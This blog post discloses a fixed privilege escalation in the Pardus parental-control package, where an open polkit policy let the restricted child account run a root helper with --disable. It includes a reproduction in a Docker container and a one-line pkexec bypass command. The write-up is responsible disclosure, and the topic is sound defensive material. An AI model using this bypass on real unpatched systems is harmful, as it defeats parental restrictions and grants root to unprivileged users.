---
layout: post
title: "Pardus parental control let any child account become root via a one-line pkexec"
author: Yunus Aydın
date: 2026-06-14
lang: en
description: "Pardus pardus-parental-control shipped a polkit policy with allow_any=yes, letting the restricted child account pkexec PPCActivator.py --disable as root and remove every filter. Fixed in v0.7.0."
keywords: "Pardus, pardus-parental-control, polkit, pkexec, privilege escalation, parental control bypass, CWE-269, CWE-862, allow_any, auth_admin, Linux security, security research"
canonical_url: "https://aydinnyunus.github.io/2026/06/14/pardus-parental-control-polkit-privilege-escalation/"
---

I reported a local privilege escalation in [pardus-parental-control](https://github.com/pardus/pardus-parental-control) to the Pardus team on June 6, 2026 as [PR #5](https://github.com/pardus/pardus-parental-control/pull/5). The polkit action that controls the program's `--disable` mode was wide open. Any local user, including the very restricted child account the software is supposed to be protecting, could call `pkexec PPCActivator.py --disable` and strip every filter from the system. No password. No prompt. No log entry that would look out of place.

The maintainer confirmed the bug, declined my one-line fix because it broke the login flow, and shipped a proper refactor as [v0.7.0](https://github.com/pardus/pardus-parental-control/releases/tag/debian%2F0.7.0) on June 10, 2026.

## Background

Pardus is the Turkish national Linux distribution maintained by TÜBİTAK. `pardus-parental-control` is the package that gives parents a GTK UI to restrict what their kids can do on a shared machine: blocked applications, blocked websites, daily session time limits, custom DNS.

I was poking around the repo because I had been auditing how distro-shipped GUI tools use polkit. The pattern is almost a meme at this point: a developer wants `pkexec my-helper.py` to "just work" inside the GUI, sets `allow_any=yes` to silence the password prompt during testing, ships it, and forgets.

That is exactly what this was.

## The vulnerable policy

The policy file lives at `polkit/tr.org.pardus.pkexec.parental-control.policy`. The interesting block, as of `debian/0.6.1`:

```xml
<action id="tr.org.pardus.pkexec.parental-control-action">
  <description>Pardus Restricted Access Authentication</description>
  <message>Authentication is required.</message>
  <icon_name>preferences-system</icon_name>

  <defaults>
    <allow_any>yes</allow_any>
    <allow_inactive>yes</allow_inactive>
    <allow_active>yes</allow_active>
  </defaults>

  <annotate key="org.freedesktop.policykit.exec.path">/usr/share/pardus/pardus-parental-control/src/PPCActivator.py</annotate>
  <annotate key="org.freedesktop.policykit.exec.allow_gui">true</annotate>
  <annotate key="org.freedesktop.policykit.owner">unix-user:root</annotate>
</action>
```

The three `<allow_*>` values control who is allowed to invoke the action and whether they must authenticate. `yes` means "allow, no auth needed." Setting all three to `yes` means literally any local UID can run the wrapped program as root, regardless of session state.

What does the wrapped program do? `PPCActivator.py` accepts a `--disable` flag. The relevant snippet:

```python
if sys.argv[1] == "--disable":
    activator.clear_application_filter()
    activator.clear_website_filter()
    sys.exit(0)
```

`clear_application_filter()` and `clear_website_filter()` are exactly what they sound like. They tear down the iptables/nftables rules, the dnsmasq overrides, and the application launcher restrictions that the parental control is enforcing.

So the policy says "anyone can run this as root, no auth." The program says "if you pass --disable, clear all the filters." Compose those two and you have a privilege escalation that doubles as a parental control bypass, executable by the account that the control was supposed to restrict.

The same repo, in the same file, already had the correct pattern for a different action:

```xml
<action id="tr.org.pardus.pkexec.parental-control-action-system-preferences-change">
  <defaults>
    <allow_any>auth_admin</allow_any>
    <allow_inactive>auth_admin</allow_inactive>
    <allow_active>auth_admin_keep</allow_active>
  </defaults>
  ...
</action>
```

That one required admin authentication. Two actions, side by side, one safe and one not. Classic copy-paste skew.

## Proof of concept

The reproduction is genuinely a single command. I built it inside a Debian Bookworm container so I would not need a Pardus VM:

```bash
# Spin up a clean Debian box
docker run -d --name pardus-poc --privileged debian:bookworm sleep infinity
docker exec -it pardus-poc bash

# Install polkit and the package as it shipped
apt-get update
apt-get install -y polkit python3 git
git clone --branch debian/0.6.1 https://github.com/pardus/pardus-parental-control.git
cp pardus-parental-control/polkit/tr.org.pardus.pkexec.parental-control.policy \
   /usr/share/polkit-1/actions/
mkdir -p /usr/share/pardus/pardus-parental-control/src
cp -r pardus-parental-control/src/* /usr/share/pardus/pardus-parental-control/src/

# Create the "child" account that the software is meant to restrict
useradd -m -s /bin/bash kid

# As kid, bypass the parental control
su - kid -c "id; pkexec /usr/share/pardus/pardus-parental-control/src/PPCActivator.py --disable; echo exit=$?"
```

Output:

```text
uid=1000(kid) gid=1000(kid) groups=1000(kid)
=== PPCActivator Service Started ===
exit=0
```

No prompt. No `polkit-auth-dialog`. Effective UID 0 inside the wrapped script. Filters cleared. The kid is now on the open internet with whatever apps they like.

For anyone who wants to confirm the effective UID before the script does its work, drop a one-liner at the top of `PPCActivator.py`:

```python
import os, sys
sys.stderr.write(f"uid={os.getuid()} euid={os.geteuid()} pkexec_uid={os.environ.get('PKEXEC_UID')}\n")
```

You will see `uid=0 euid=0 pkexec_uid=1000`. That `PKEXEC_UID=1000` is the smoking gun: pkexec elevated the kid (UID 1000) to root, and the script never checked.

## Impact

* The restricted child account, the exact user the software exists to constrain, can disable the entire parental control with a single command they can paste from a tutorial or a Discord screenshot.
* Any other local UID, including service accounts or compromised low-privilege processes, gets a free root LPE on a Pardus desktop with this package installed. The polkit action runs `PPCActivator.py` as root, and the script trusts argv unconditionally.
* No audit trail in `auth.log` because there is no authentication event to log. The only footprint is the application's own `/var/log/pardus-parental-control.log` entry, which a curious kid can read and learn from.
* Defeats the entire trust model of a shipped distro feature aimed at non-technical parents. The parent reasonably assumes that the GUI password prompt they saw during setup means future changes also require a password.

## The fix

My PR was three characters per line, three lines:

```diff
-      <allow_any>yes</allow_any>
-      <allow_inactive>yes</allow_inactive>
-      <allow_active>yes</allow_active>
+      <allow_any>auth_admin</allow_any>
+      <allow_inactive>auth_admin</allow_inactive>
+      <allow_active>auth_admin_keep</allow_active>
```

`auth_admin` makes polkit demand the admin password before letting the action run. `auth_admin_keep` is the same but caches the credential for five minutes inside an active session so the admin is not prompted on every consecutive call.

The maintainer pointed out, correctly, that my patch broke the login flow. `PPCActivator.py` is also invoked at login (without `--disable`) to apply the restrictions, and forcing an admin prompt at every login would either annoy the parent into uninstalling the package or, worse, train them to click "Cancel" and accidentally let the kid through.

The proper fix, which landed in v0.7.0, splits the single overloaded polkit action into separate actions per operation. Applying restrictions on login stays passwordless. Disabling them requires admin auth. Session logging stays automatic. System preference changes already required auth. Four narrowly scoped actions instead of one open door.

That is the correct shape of the fix. The general lesson is that a single polkit action that gates "do anything as root with this script" is always going to be wrong, because the script will grow and the policy will lag.

## Why this pattern keeps showing up

The polkit configuration model is one of those interfaces that punishes the lazy path. `allow_any=yes` is shorter to type than `auth_admin`, it makes the dev-loop quieter, and the consequences only show up when an attacker who shares the box runs the wrong subcommand. Static analysis tools rarely flag it because the file is XML in a vendor-named directory that nobody reviews after the initial PR.

The deeper structural problem is that the policy authorizes a *program*, not an *operation*. The Pardus team wrote one action that says "anyone can run PPCActivator.py as root" without realizing that `PPCActivator.py` covers two very different operations: apply restrictions (which should be silent and automatic) and remove restrictions (which should require admin). Polkit gives you the building blocks to express that distinction. You have to choose to use them.

The same shape appears in dozens of CVEs against Linux desktop helpers over the years. Anything where a developer wires a script to pkexec for convenience and forgets to think about who else might be sitting at the keyboard. CWE-269 (Improper Privilege Management) and CWE-862 (Missing Authorization) both apply here, with the polkit-specific flavor that the missing authorization is right there in the XML, waiting to be set to `auth_admin`.

## Disclosure timeline

* **June 6, 2026** I opened PR #5 on `pardus/pardus-parental-control` with the analysis, PoC, and a three-line patch.
* **June 7, 2026** Maintainer @eminfedar confirmed the bug, declined the exact PR because it would break login UX, and committed to a proper refactor.
* **June 10, 2026** `debian/0.7.0` shipped, splitting the polkit action and landing the real fix. Maintainer thanked me in the PR thread.
* **June 14, 2026** I published this write-up.

No CVE was requested or assigned. The fix is upstream and tagged. Anyone on `debian/0.6.1` or earlier should update.

## References

* [PR #5: fix: require admin auth for PPCActivator.py polkit action](https://github.com/pardus/pardus-parental-control/pull/5)
* [Release debian/0.7.0](https://github.com/pardus/pardus-parental-control/releases/tag/debian%2F0.7.0)
* [polkit pkexec(1) documentation](https://www.freedesktop.org/software/polkit/docs/latest/pkexec.1.html)
* [CWE-269: Improper Privilege Management](https://cwe.mitre.org/data/definitions/269.html)
* [CWE-862: Missing Authorization](https://cwe.mitre.org/data/definitions/862.html)

## Related content

* [Family Link trailing-dot bypass: how I escaped Google's parental controls]({% post_url 2026-06-14-family-link-trailing-dot-bypass %})
* [BasicSR slurm runner: command injection via dataset path (CVE-2024-27763)]({% post_url 2026-06-14-cve-2024-27763-basicsr-slurm-command-injection %})

If your distro package wires a Python script to pkexec, read the policy file before you read the script. The `<defaults>` block tells you everything about who can call you, and `yes` is never the right answer there.
